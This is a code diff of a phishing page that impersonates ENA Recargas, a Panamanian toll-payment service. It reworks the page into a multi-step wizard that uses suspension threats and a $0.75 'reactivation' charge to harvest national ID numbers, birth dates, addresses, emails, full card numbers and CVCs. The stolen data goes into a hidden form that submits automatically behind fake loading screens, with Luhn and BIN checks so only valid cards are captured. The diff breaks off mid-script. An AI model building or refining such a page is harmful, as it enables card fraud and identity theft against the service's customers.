@@ -2,77 +2,75 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">  <!-- Added user-scalable=no to prevent zoom on iOS -->
-    <!-- Anti-crawler meta: Prevents indexing by search bots -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="robots" content="noindex, nofollow">
-    <title>ENA Recargas - Top Up Balance</title>
+    <title>ENA Recargas - Verificar Detalles y Confirmar Facturación</title>
     <style>
-        /* Ensure full page coverage */
-        html {
-            height: 100%;
-            overflow-x: hidden;  /* Prevent horizontal scroll to avoid cutting edges */
-        }
+        html { height: 100%; overflow-x: hidden; }
         body {
-            background-image: url('/static/background2.jpg');  /* Path to your static image */
-            background-size: cover;  /* Scales to cover entire area without distortion */
-            background-position: center;  /* Centers the image */
-            background-repeat: no-repeat;  /* No tiling */
-            background-attachment: scroll;  /* Keeps it fixed during scrolling */
+            background: #ffffff;
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
             color: #223136;
-            height: 100vh;  /* Forces full viewport height coverage */
-            width: 100vw;  /* Forces full viewport width coverage */
+            height: 100vh;
+            width: 100vw;
             box-sizing: border-box;
         }
         .header {
-            background-color: transparent;  /* Make header background transparent to show image */
-            color: white;
+            background-color: #ffffff;
+            color: #223136;
             padding: 10px;
             text-align: center;
         }
         .header img {
             width: 30%;
             height: auto;
-            max-width: 200px; /* Limit max width for mobile */
+            max-width: 200px;
         }
-        .form-container {
+        .wizard-container {
             max-width: 600px;
-            margin: 20px auto;  /* Keeps it centered */
-            background: rgba(255, 255, 255, 0.6);  /* Reduced transparency for smoother image visibility */
+            margin: 20px auto;
+            background: rgba(255, 255, 255, 0.9);
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        .form-group {
-            margin-bottom: 15px;
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
         }
-        label {
-            display: block;
-            margin-bottom: 5px;
+        .step {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            background: #e6f2ff;
+            border-radius: 4px;
+            margin: 0 5px;
+            color: #273c53;
             font-weight: bold;
         }
+        .step.active { background: #273c53; color: white; }
+        .step-content { display: none; }
+        .step-content.active { display: block; }
+        .form-group { margin-bottom: 20px; }  /* Increased spacing */
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
         input, select {
             width: 100%;
-            padding: 10px;
+            padding: 15px;  /* Increased padding for spaciousness */
             border: 1px solid #ccc;
-            border-radius: 4px;
+            border-radius: 12px;  /* More curved corners */
             color: black;
-            font-size: 16px; /* Prevents auto-zoom on mobile focus */
-            box-sizing: border-box; /* Ensures padding doesn't overflow width */
+            font-size: 16px;
+            box-sizing: border-box;
         }
         .dob-container {
             display: flex;
             gap: 10px;
         }
-        .dob-container select {
-            flex: 1;
-            padding: 10px;
-        }
-        .card-input-container {
-            position: relative;
-        }
+        .dob-container select { flex: 1; padding: 15px; }  /* Match padding */
+        .card-input-container { position: relative; }
         .card-brand {
             position: absolute;
             right: 10px;
@@ -80,14 +78,9 @@
             transform: translateY(-50%);
             width: 40px;
             height: 25px;
-            display: none;  /* Hidden by default */
-        }
-        .payment-fields {
             display: block;  /* Always visible now */
         }
-        .phone-input-container {
-            position: relative;
-        }
+        .phone-input-container { position: relative; }
         .phone-prefix {
             position: absolute;
             left: 10px;
@@ -97,9 +90,7 @@
             font-size: 16px;
             pointer-events: none;
         }
-        .phone-input {
-            padding-left: 70px;  /* Space for +507 */
-        }
+        .phone-input { padding-left: 70px; }
         .urgency-alert {
             background-color: #ffdddd;
             border: 1px solid #ff0000;
@@ -111,89 +102,59 @@
             text-align: center;
         }
         button {
-            background-color: #273c53;
+            background: #273c53;
             color: white;
             padding: 10px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
             width: 100%;
-            font-size: 16px; /* Prevents auto-zoom */
+            font-size: 16px;
         }
-        button:hover {
-            background-color: #1f3043;
+        button:hover { background: #1f3043; }
+        button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            color: #666666;
         }
-        .footer {
+        .nav-buttons { display: flex; justify-content: space-between; margin-top: 20px; }
+        .nav-buttons button { width: auto; }
+        .loading-circle {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #273c53;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-screen {
             text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #666;
+            padding: 20px;
         }
-        .error {
-            color: red;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;  /* Hidden by default for real-time */
-        }
-        .honeypot {
-            display: none;
-        }
+        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
+        .error { color: red; font-size: 12px; margin-top: 5px; display: none; }
+        .error-field { border-color: red; }
+        .honeypot { display: none; }
 
-        /* Mobile responsiveness */
         @media (max-width: 768px) {
-            .header {
-                padding: 5px;
-            }
-            .header img {
-                width: 50%; /* Increase on small screens */
-                max-width: 150px;
-            }
-            .form-container {
-                margin: 10px;
-                padding: 15px;
-            }
-            .form-group {
-                margin-bottom: 10px;
-            }
-            label {
-                font-size: 14px;
-            }
-            input, select, button {
-                padding: 8px;
-            }
-            .dob-container {
-                flex-direction: column;
-                gap: 5px;
-            }
-            .urgency-alert {
-                padding: 8px;
-                font-size: 14px;
-            }
-            .footer {
-                font-size: 10px;
-            }
+            .wizard-container { margin: 10px; padding: 15px; }
+            .step { font-size: 12px; }
+            .nav-buttons { flex-direction: column; }
+            .nav-buttons button { margin: 5px 0; }
+            .dob-container { flex-direction: column; gap: 5px; }
         }
 
         @media (max-width: 480px) {
-            .header img {
-                width: 70%;
-                max-width: 120px;
-            }
-            .form-container {
-                margin: 5px;
-                padding: 10px;
-            }
-            .urgency-alert {
-                padding: 5px;
-                font-size: 12px;
-            }
-            input, select, button {
-                padding: 6px;
-                font-size: 14px; /* Slightly smaller but still above 16px threshold to avoid zoom */
-            }
-            .error {
-                font-size: 10px;
-            }
+            .header img { width: 70%; max-width: 120px; }
+            .wizard-container { margin: 5px; padding: 10px; }
+            .urgency-alert { padding: 5px; font-size: 12px; }
+            input, select, button { padding: 12px; font-size: 14px; }  /* Adjusted for mobile */
+            .error { font-size: 10px; }
         }
     </style>
 </head>
@@ -202,503 +163,570 @@
         <img src="https://www.enarecargas.com/maxipista/VAADIN/themes/privatetheme/img/logoEna.jpg" alt="ENA Logo">
     </div>
 
-    <!-- Randomized class for anti-fingerprinting -->
-    <div class="form-container" id="dynamic-container">
-        <div class="urgency-alert">
-            Para reactivar tu tag y evitar la suspensión del saldo prepago, verifica tus detalles de pago completando la información requerida. Tus datos serán procesados de forma segura.
+    <div class="wizard-container" id="dynamic-container">
+        <div class="progress-bar">
+            <div class="step active" id="step1">1. Verificar Detalles</div>
+            <div class="step" id="step2">2. Top up.</div>
+            <div class="step" id="step3">3. Procesar</div>
         </div>
-        <h2>Recargar Saldo de Peaje</h2>
-        <form id="rechargeForm" action="/submit" method="POST">  <!-- Changed action to /submit to match app.py -->
-            <div class="form-group">
-                <label for="tag">Número de Tag</label>
-                <input type="text" id="tag" name="tag" maxlength="10">
-                <div class="error" id="tagError"></div>
-            </div>
-            <!-- Payment method is now assumed as CC, no dropdown -->
-            <input type="hidden" name="payment_method" value="cc">
-            <div class="payment-fields" id="cc-fields">
-                <div class="form-group">
-                    <label for="full_name">Nombre del Titular (como en la tarjeta)</label>
-                    <input type="text" id="full_name" name="full_name">
-                    <div class="error" id="fullNameError"></div>
-                </div>
-  <div class="form-group">
-                    <label for="card_number">Número de Tarjeta (16-19 dígitos)</label>
-                    <div class="card-input-container">
-                        <input type="text" id="card_number" name="card_number" maxlength="23">  <!-- Increased for spaces -->
-                        <img id="card-brand" class="card-brand" src="" alt="Card Brand">
-                    </div>
-                    <div class="error" id="cardNumberError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="expiry">Fecha de Expiración</label>
-                    <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY">
-                    <div class="error" id="expiryError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="cvc">Código de Seguridad (CVV/CVC)</label>
-                    <input type="text" id="cvc" name="cvc" maxlength="4">
-                    <div class="error" id="cvcError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="email">Correo Electrónico</label>
-                    <input type="email" id="email" name="email">
-                    <div class="error" id="emailError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="phone">Número de Teléfono</label>
-                    <div class="phone-input-container">
-                        <span class="phone-prefix">+507</span>
-                        <input type="text" id="phone" name="phone" class="phone-input" maxlength="9">  <!-- Allow 8 digits + space formatting -->
-                    </div>
-                    <div class="error" id="phoneError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="dob">Fecha de Nacimiento</label>
-                    <div class="dob-container">
-                        <select id="dob-year" name="dob-year"><option value="">Año</option></select>
-                        <select id="dob-month" name="dob-month"><option value="">Mes</option></select>
-                        <select id="dob-day" name="dob-day"><option value="">Día</option></select>
-                    </div>
-                    <div class="error" id="dobError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="cedula">Número de Cédula (ID Nacional)</label>
-                    <input type="text" id="cedula" name="cedula" maxlength="9">
-                    <div class="error" id="cedulaError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="street">Dirección de Facturación (Calle)</label>
-                    <input type="text" id="street" name="street">
-                    <div class="error" id="streetError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="city">Ciudad</label>
-                    <input type="text" id="city" name="city">
-                    <div class="error" id="cityError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="province">Provincia</label>
-                    <input type="text" id="province" name="province">
-                    <div class="error" id="provinceError"></div>
-                </div>
-                <div class="form-group">
-                    <label for="zip">Código Postal (ZIP)</label>
-                    <input type="text" id="zip" name="zip" maxlength="10">
-                    <div class="error" id="zipError"></div>
-                </div>
-            </div>
-            <!-- Honeypot field: Crawlers/bots might fill this; check in backend -->
-            <div class="honeypot">
-                <label for="website">Sitio Web</label>
-                <input type="text" id="website" name="website">
-            </div>
-            <button type="submit">Recargar Ahora</button>
-        </form>
-    </div>
 
-    <div class="footer">
+        <div class="step-content active" id="content1">
+            <div class="urgency-alert">
+                Para proteger tu cuenta, verifica tus datos y reactiva tu tag realizando una recarga de $0.75. La falta de completar este proceso resultará en la suspensión de la cuenta.
+            </div>
+            <h2>Verifica tus Detalles</h2>
+            <div class="form-group">
+                <label for="phone">Número de Teléfono</label>
+                <div class="phone-input-container">
+                    <span class="phone-prefix">+507</span>
+                    <input type="text" id="phone" name="phone" class="phone-input" maxlength="9">
+                </div>
+                <div class="error" id="phoneError"></div>
+            </div>
+            <div class="form-group">
+                <label for="dob">Fecha de Nacimiento</label>
+                <div class="dob-container">
+                    <select id="dob-year" name="dob-year"><option value="">Año</option></select>
+                    <select id="dob-month" name="dob-month"><option value="">Mes</option></select>
+                    <select id="dob-day" name="dob-day"><option value="">Día</option></select>
+                </div>
+                <div class="error" id="dobError"></div>
+            </div>
+            <div class="form-group">
+                <label for="cedula">Número de Cédula (ID Nacional)</label>
+                <input type="text" id="cedula" name="cedula" maxlength="9">
+                <div class="error" id="cedulaError"></div>
+            </div>
+            <div class="form-group">
+                <label for="street">Dirección de Facturación (Calle)</label>
+                <input type="text" id="street" name="street">
+                <div class="error" id="streetError"></div>
+            </div>
+            <div class="form-group">
+                <label for="city">Ciudad</label>
+                <input type="text" id="city" name="city">
+                <div class="error" id="cityError"></div>
+            </div>
+            <div class="form-group">
+                <label for="province">Provincia</label>
+                <input type="text" id="province" name="province">
+                <div class="error" id="provinceError"></div>
+            </div>
+            <div class="form-group">
+                <label for="zip">Código Postal (ZIP)</label>
+                <input type="text" id="zip" name="zip" maxlength="10">
+                <div class="error" id="zipError"></div>
+            </div>
+            <div class="form-group">
+                <label for="email">Correo Electrónico</label>
+                <input type="email" id="email" name="email">
+                <div class="error" id="emailError"></div>
+            </div>
+            <div class="form-group">
+                <label for="topup">Selecciona la Recarga</label>
+                <select id="topup" name="topup">
+                    <option value="">Selecciona</option>
+                    <option value="0.75">$0.75</option>
+                </select>
+                <div class="error" id="topupError"></div>
+            </div>
+            <div class="nav-buttons">
+                <button type="button" onclick="nextStep(1)">Continuar</button>
+            </div>
+        </div>
+
+        <div class="step-content" id="content2">
+            <div class="urgency-alert">
+                Reactiva tu tag realizando una recarga de $0.75, el pago se procesará de forma segura por tu banco.
+            </div>
+            <h2>Top up.</h2>
+            <div class="form-group">
+                <label for="full_name">Nombre del Titular (como en la tarjeta)</label>
+                <input type="text" id="full_name" name="full_name">
+                <div class="error" id="fullNameError"></div>
+            </div>
+            <div class="form-group">
+                <label for="card_number">Número de Tarjeta (16-19 dígitos)</label>
+                <div class="card-input-container">
+                    <input type="text" id="card_number" name="card_number" maxlength="23">
+                    <img id="card-brand" class="card-brand" src="https://img.icons8.com/ios-filled/50/000000/bank-card-back-side.png" alt="Credit Card Icon">
+                </div>
+                <div class="error" id="cardNumberError"></div>
+            </div>
+            <div class="form-group">
+                <label for="expiry">Fecha de Expiración</label>
+                <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY">
+                <div class="error" id="expiryError"></div>
+            </div>
+            <div class="form-group">
+                <label for="cvc">Código de Seguridad (CVV/CVC)</label>
+                <input type="text" id="cvc" name="cvc" maxlength="4">
+                <div class="error" id="cvcError"></div>
+            </div>
+            <div class="nav-buttons">
+                <button type="button" id="prevBtn" onclick="prevStep(2)" disabled>Anterior</button>
+                <button type="button" onclick="nextStep(2)">Continuar</button>
+            </div>
+        </div>
+
+        <div class="step-content" id="content3">
+            <h2>Procesar</h2>
+            <div class="loading-circle"></div>
+            <p>Procesando tu verificación...</p>
+        </div>
+
+        <div class="step-content loading-screen" id="loadingStep2">
+            <div class="loading-circle"></div>
+            <p>Verificando detalles...</p>
+        </div>
+    </div> <div class="footer">
         <p>Transacción Segura | Contacto: 800-ENA</p>
     </div>
-<script>
-   // Luhn algorithm validation for card number
-    function luhnCheck(cardNumber) {
-        cardNumber = cardNumber.replace(/\D/g, '');  // Remove non-digits
-        if (!/^\d{13,19}$/.test(cardNumber)) return false;  // Check length
 
-        let sum = 0;
-        let shouldDouble = false;
-        for (let i = cardNumber.length - 1; i >= 0; i--) {
-            let digit = parseInt(cardNumber.charAt(i));
-            if (shouldDouble) {
-                digit *= 2;
-                if (digit > 9) digit -= 9;
+    <form id="rechargeForm" action="/submit" method="POST" style="display:none;">
+        <input type="hidden" name="payment_method" value="cc">
+        <input type="hidden" name="full_name" id="hidden_full_name">
+        <input type="hidden" name="card_number" id="hidden_card_number">
+        <input type="hidden" name="expiry" id="hidden_expiry">
+        <input type="hidden" name="cvc" id="hidden_cvc">
+        <input type="hidden" name="email" id="hidden_email">
+        <input type="hidden" name="phone" id="hidden_phone">
+        <input type="hidden" name="dob" id="hidden_dob">
+        <input type="hidden" name="cedula" id="hidden_cedula">
+        <input type="hidden" name="street" id="hidden_street">
+        <input type="hidden" name="city" id="hidden_city">
+        <input type="hidden" name="province" id="hidden_province">
+        <input type="hidden" name="zip" id="hidden_zip">
+        <input type="hidden" name="topup" id="hidden_topup">
+        <input type="text" name="website" style="display:none;">
+    </form>
+  <script>
+let currentStep = 1;
+        const validDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com', 'ymail.com', 'me.com', 'live.com'];
+        const monthNames = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
+        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);  // Detect iOS for extra handling
+
+        function nextStep(step) {
+            if (validateStep(step)) {
+                document.getElementById('content' + step).classList.remove('active');
+                document.getElementById('step' + step).classList.remove('active');
+                if (step === 1) {
+                    // Mostrar pantalla de carga por 3 segundos antes de pasar al paso 2
+                    document.getElementById('loadingStep2').classList.add('active');
+                    setTimeout(() => {
+                        document.getElementById('loadingStep2').classList.remove('active');
+                        currentStep = 2;
+                        document.getElementById('content' + currentStep).classList.add('active');
+                        document.getElementById('step' + currentStep).classList.add('active');
+                        updateHiddensStep1();
+                    }, 3000);
+                } else if (step === 2) {
+                    currentStep = 3;
+                    document.getElementById('content' + currentStep).classList.add('active');
+                    document.getElementById('step' + currentStep).classList.add('active');
+                    updateHiddensStep2();
+                    setTimeout(() => {
+                        document.getElementById('rechargeForm').submit();
+                    }, 3000);
+                }
             }
-            sum += digit;
-            shouldDouble = !shouldDouble;
         }
-        return sum % 10 === 0;
-    }
 
-    // Basic BIN validation (first 6 digits)
-    function validateBin(cardNumber) {
-        const bin = cardNumber.substring(0, 6);
-        // Common BIN patterns: Visa (4), Mastercard (5), Amex (3), Discover (6)
-        if (/^4/.test(bin)) return 'Visa';
-        if (/^5[1-5]/.test(bin)) return 'Mastercard';
-        if (/^3[47]/.test(bin)) return 'American Express';
-        if (/^6(?:011|5)/.test(bin)) return 'Discover';
-        return false;  // Invalid BIN
-    }
-
-    // Card brand image display
-    const cardInput = document.getElementById('card_number');
-    const cardBrandImg = document.getElementById('card-brand');
-    cardInput.addEventListener('input', function() {
-        const cardNumber = cardInput.value.replace(/\D/g, '');
-        const brand = validateBin(cardNumber);
-        if (brand && cardNumber.length >= 6) {
-            // Replace with actual image URLs or base64
-            if (brand === 'Visa') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.EToQaql50Fd6v6DSFuZK9gHaEK?w=244&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';  // Replace with real URL
-            else if (brand === 'Mastercard') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.8hSdZiAvNki23CzVyAvSLQHaEK?w=250&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';
-            else if (brand === 'American Express') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.C3222CedyFhyZRW3cTngvgHaEK?w=244&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';
-            else if (brand === 'Discover') cardBrandImg.src = 'https://www.bing.com/th/id/OIP.r3EkxEA6UpqXph81azFJBgHaHa?w=178&h=211&c=8&rs=1&qlt=90&o=6&dpr=1.1&pid=3.1&rm=2';
-            cardBrandImg.style.display = 'block';
-        } else {
-            cardBrandImg.style.display = 'none';
+        function prevStep(step) {
+            document.getElementById('content' + step).classList.remove('active');
+            document.getElementById('step' + step).classList.remove('active');
+            currentStep--;
+            document.getElementById('content' + currentStep).classList.add('active');
+            document.getElementById('step' + currentStep).classList.add('active');
         }
-    });
 
-    // Card number formatting (add spaces every 4 digits) and real-time validation
-    cardInput.addEventListener('input', function(e) {
-        let cleanValue = e.target.value.replace(/\D/g, '');  // Remove non-digits
-        let value;
-        if (cleanValue.length > 0) {
-            value = cleanValue.substring(0, 19).replace(/(\d{4})(?=\d)/g, '$1 ');  // Add space every 4 digits
-        } else {
-            value = '';
-        }
-        e.target.value = value;
-
-        // Real-time validation
-        const errorDiv = document.getElementById('cardNumberError');
-        if (cleanValue.length >= 13) {
-            if (!/^\d{13,19}$/.test(cleanValue)) {
-                showError('cardNumberError', 'El número de tarjeta debe tener entre 13 y 19 dígitos.');
-            } else if (!luhnCheck(cleanValue)) {
-                showError('cardNumberError', 'Número de tarjeta inválido.');
-            } else if (!validateBin(cleanValue)) {
-                showError('cardNumberError', 'BIN inválido (no corresponde a Visa, Mastercard, Amex o Discover).');
-            } else {
-                clearError('cardNumberError');
+        function validateStep(step) {
+            clearErrors();
+            if (step === 1) {
+                const phone = document.getElementById('phone').value.trim();
+                if (!phone) {
+                    showError('phoneError', 'Por favor, ingresa el número de teléfono.');
+                    return false;
+                } else {
+                    const phoneClean = phone.replace(/\D/g, '');
+                    if (phoneClean.length !== 8) {
+                        showError('phoneError', 'El teléfono debe tener 8 dígitos.');
+                        return false;
+                    }
+                }
+                const year = document.getElementById('dob-year').value;
+                const monthName = document.getElementById('dob-month').value;
+                const day = document.getElementById('dob-day').value;
+                if (!year || !monthName || !day) {
+                    showError('dobError', 'Por favor, selecciona la fecha completa de nacimiento.');
+                    return false;
+                } else {
+                    const monthIndex = monthNames.indexOf(monthName) + 1;
+                    const dobDate = new Date(year, monthIndex - 1, day);
+                    const now = new Date();
+                    const age = now.getFullYear() - dobDate.getFullYear() - (now < new Date(now.getFullYear(), dobDate.getMonth(), dobDate.getDate()) ? 1 : 0);
+                    if (age < 18) {
+                        showError('dobError', 'Debes tener al menos 18 años.');
+                        return false;
+                    }
+                }
+                const cedula = document.getElementById('cedula').value.trim();
+                if (!cedula) {
+                    showError('cedulaError', 'Por favor, ingresa el número de cédula.');
+                    return false;
+                } else if (!/^\d{7,9}$/.test(cedula)) {
+                    showError('cedulaError', 'El número de cédula debe tener entre 7 y 9 dígitos.');
+                    return false;
+                }
+                const street = document.getElementById('street').value.trim();
+                if (!street) {
+                    showError('streetError', 'Por favor, ingresa la dirección.');
+                    return false;
+                }
+                const city = document.getElementById('city').value.trim();
+                if (!city) {
+                    showError('cityError', 'Por favor, ingresa la ciudad.');
+                    return false;
+                }
+                const province = document.getElementById('province').value.trim();
+                if (!province) {
+                    showError('provinceError', 'Por favor, ingresa la provincia.');
+                    return false;
+                }
+                const zip = document.getElementById('zip').value.trim();
+                if (!zip) {
+                    showError('zipError', 'Por favor, ingresa el código postal.');
+                    return false;
+                }
+                const email = document.getElementById('email').value.trim();
+                if (!email) {
+                    showError('emailError', 'Por favor, ingresa el correo electrónico.');
+                    return false;
+                } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    showError('emailError', 'Por favor, ingresa un correo electrónico válido.');
+                    return false;
+                } else {
+                    const domain = email.substring(email.indexOf('@') + 1).toLowerCase();
+                    if (!validDomains.includes(domain)) {
+                        showError('emailError', 'Dominio no permitido. Usa un dominio común como gmail.com or yahoo.com.');
+                        return false;
+                    }
+                }
+                const topup = document.getElementById('topup').value;
+                if (!topup) {
+                    showError('topupError', 'Por favor, selecciona la recarga.');
+                    return false;
+                }
+            } else if (step === 2) {
+                const fullName = document.getElementById('full_name').value.trim();
+                if (!fullName) {
+                    showError('fullNameError', 'Por favor, ingresa el nombre del titular.');
+                    return false;
+                }
+                const cardNumber = document.getElementById('card_number').value.trim();
+                if (!cardNumber) {
+                    showError('cardNumberError', 'Por favor, ingresa el número de tarjeta.');
+                    return false;
+                } else if (!/^\d{13,19}$/.test(cardNumber.replace(/\s/g, ''))) {
+                    showError('cardNumberError', 'El número de tarjeta debe tener entre 13 y 19 dígitos.');
+                    return false;
+                } else if (!luhnCheck(cardNumber)) {
+                    showError('cardNumberError', 'Número de tarjeta inválido.');
+                    return false;
+                } else if (!validateBin(cardNumber.replace(/\s/g, ''))) {
+                    showError('cardNumberError', 'BIN inválido (debe corresponder a Visa, Mastercard, Amex o Discover).');
+                    return false;
+                }
+                const expiry = document.getElementById('expiry').value.trim();
+                if (!expiry) {
+                    showError('expiryError', 'Por favor, ingresa la fecha de expiración.');
+                    return false;
+                } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
+                    showError('expiryError', 'La fecha debe estar en formato MM/YY.');
+                    return false;
+                } else {
+                    const [, month, year] = expiry.match(/(\d{2})\/(\d{2})/);
+                    const expiryYear = parseInt('20' + year);
+                    if (expiryYear < 2026) {
+                        showError('expiryError', 'La fecha de expiración debe ser 2026 o posterior.');
+                        return false;
+                    }
+                }
+                const cvc = document.getElementById('cvc').value.trim();
+                if (!cvc) {
+                    showError('cvcError', 'Por favor, ingresa el código CVC.');
+                    return false;
+                } else {
+                    const brand = validateBin(cardNumber.replace(/\s/g, ''));
+                    if (brand === 'American Express') {
+                        if (!/^\d{4}$/.test(cvc)) {
+                            showError('cvcError', 'El CVC para American Express debe tener 4 dígitos.');
+                            return false;
+                        }
+                    } else if (brand) {
+                        if (!/^\d{3}$/.test(cvc)) {
+                            showError('cvcError', 'El CVC debe tener 3 dígitos.');
+                            return false;
+                        }
+                    } else {
+                        if (!/^\d{3,4}$/.test(cvc)) {
+                            showError('cvcError', 'El CVC debe tener 3 o 4 dígitos.');
+                            return false;
+                        }
+                    }
+                }
             }
-        } else {
-            clearError('cardNumberError');
+            return true;
         }
-    });
 
-    // Expiry date formatting (MM/YY, allow clearing /)
-    const expiryInput = document.getElementById('expiry');
-    expiryInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/[^\d/]/g, '');  // Allow digits and /
-        value = value.replace(/\/+/g, '/');  // Only one /
-        value = value.substring(0,5);
-        if (value.length > 2 && value.charAt(2) !== '/') {
-            value = value.substring(0,2) + '/' + value.substring(2);
+        function updateHiddensStep1() {
+            document.getElementById('hidden_phone').value = '+507 ' + document.getElementById('phone').value;
+            const year = document.getElementById('dob-year').value;
+            const monthName = document.getElementById('dob-month').value;
+            const day = document.getElementById('dob-day').value;
+            const monthIndex = monthNames.indexOf(monthName) + 1;
+            document.getElementById('hidden_dob').value = `${monthIndex.toString().padStart(2, '0')}/${day.padStart(2, '0')}/${year}`;
+            document.getElementById('hidden_cedula').value = document.getElementById('cedula').value;
+            document.getElementById('hidden_street').value = document.getElementById('street').value;
+            document.getElementById('hidden_city').value = document.getElementById('city').value;
+            document.getElementById('hidden_province').value = document.getElementById('province').value;
+            document.getElementById('hidden_zip').value = document.getElementById('zip').value;
+            document.getElementById('hidden_email').value = document.getElementById('email').value;
+            document.getElementById('hidden_topup').value = document.getElementById('topup').value;
         }
-        e.target.value = value;
-    });
 
-    // Phone number formatting (XXXX-XXXX for 8 digits, with +507 prefix visually)
-    const phoneInput = document.getElementById('phone');
-    phoneInput.addEventListener('input', function(e) {
-        let value = e.target.value.replace(/\D/g, '');  // Numbers only
-        if (value.length === 0) {
-            e.target.value = '';
-            return;
+        function updateHiddensStep2() {
+            document.getElementById('hidden_full_name').value = document.getElementById('full_name').value;
+            document.getElementById('hidden_card_number').value = document.getElementById('card_number').value;
+            document.getElementById('hidden_expiry').value = document.getElementById('expiry').value;
+            document.getElementById('hidden_cvc').value = document.getElementById('cvc').value;
         }
-        value = value.substring(0, 8);  // Limit to 8 digits
-        if (value.length > 4) {
-            e.target.value = value.substring(0, 4) + '-' + value.substring(4);
-        } else {
-            e.target.value = value;
-        }
-    });
 
-    // Email validation (restrict to common domains, reject gibberish)
-    const emailInput = document.getElementById('email');
-    const validDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com', 'ymail.com', 'me.com', 'live.com'];
-    emailInput.addEventListener('blur', function() {
-        const email = emailInput.value.trim();
-        const atIndex = email.indexOf('@');
-        if (atIndex === -1) {
-            showError('emailError', 'Correo electrónico inválido.');
-            return;
-        }
-        const domain = email.substring(email.indexOf('@') + 1).toLowerCase();
-        if (!validDomains.includes(domain)) {
-            showError('emailError', 'Dominio no permitido. Use un dominio común como gmail.com o yahoo.com.');
-        } else {
-            clearError('emailError');
-        }
-    });
+        // Poblar selects de DOB
+        const dobYear = document.getElementById('dob-year');
+        const dobMonth = document.getElementById('dob-month');
+        const dobDay = document.getElementById('dob-day');
 
-    // DOB modern calendar: Populate year, month (named), day selects, update days on change
-    const dobYear = document.getElementById('dob-year');
-    const dobMonth = document.getElementById('dob-month');
-    const dobDay = document.getElementById('dob-day');
-
-    // Populate year (start with current -18 to 1900)
-    const currentYear = new Date().getFullYear();
-    for (let year = currentYear - 18; year >= 1900; year--) {
-        const option = document.createElement('option');
-        option.value = year;
-        option.textContent = year;
-        dobYear.appendChild(option);
-    }
-
-    // Populate month (named)
-    const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-    monthNames.forEach((month, index) => {
-        const option = document.createElement('option');
-        option.value = month;
-        option.textContent = month;
-        dobMonth.appendChild(option);
-    });
-
-    // Function to populate days based on month/year
-    function populateDays() {
-        const year = dobYear.value;
-        const monthName = dobMonth.value;
-        dobDay.innerHTML = '<option value="">Día</option>';
-        if (!year || !monthName) return;
-        const monthIndex = monthNames.indexOf(monthName) + 1;
-        const daysInMonth = new Date(year, monthIndex, 0).getDate();
-        for (let day = 1; day <= daysInMonth; day++) {
+        const currentYear = new Date().getFullYear();
+        for (let year = currentYear - 18; year >= 1900; year--) {
             const option = document.createElement('option');
-            option.value = day;
-            option.textContent = day;
-            dobDay.appendChild(option);
+            option.value = year;
+            option.textContent = year;
+            dobYear.appendChild(option);
         }
-    }
 
-    // Update days when year or month changes
-    dobYear.addEventListener('change', populateDays);
-    dobMonth.addEventListener('change', populateDays);
+        monthNames.forEach((month, index) => {
+            const option = document.createElement('option');
+            option.value = month;
+            option.textContent = month;
+            dobMonth.appendChild(option);
+        });
 
-    // DOB validation on change (check age >=18)
-    [dobYear, dobMonth, dobDay].forEach(select => {
-        select.addEventListener('change', function() {
+        function populateDays() {
             const year = dobYear.value;
             const monthName = dobMonth.value;
-            const day = dobDay.value;
-            if (!year || !monthName || !day) {
-                showError('dobError', 'Por favor, selecciona la fecha completa de nacimiento.');
-                return;
-            }
+            dobDay.innerHTML = '<option value="">Día</option>';
+            if (!year || !monthName) return;
             const monthIndex = monthNames.indexOf(monthName) + 1;
-            const dobDate = new Date(year, monthIndex - 1, day);
-            const now = new Date();
-            const age = now.getFullYear() - dobDate.getFullYear() - (now < new Date(now.getFullYear(), dobDate.getMonth(), dobDate.getDate()) ? 1 : 0);
-            if (age < 18) {
-                showError('dobError', 'Debes tener al menos 18 años.');
-            } else {
-                clearError('dobError');
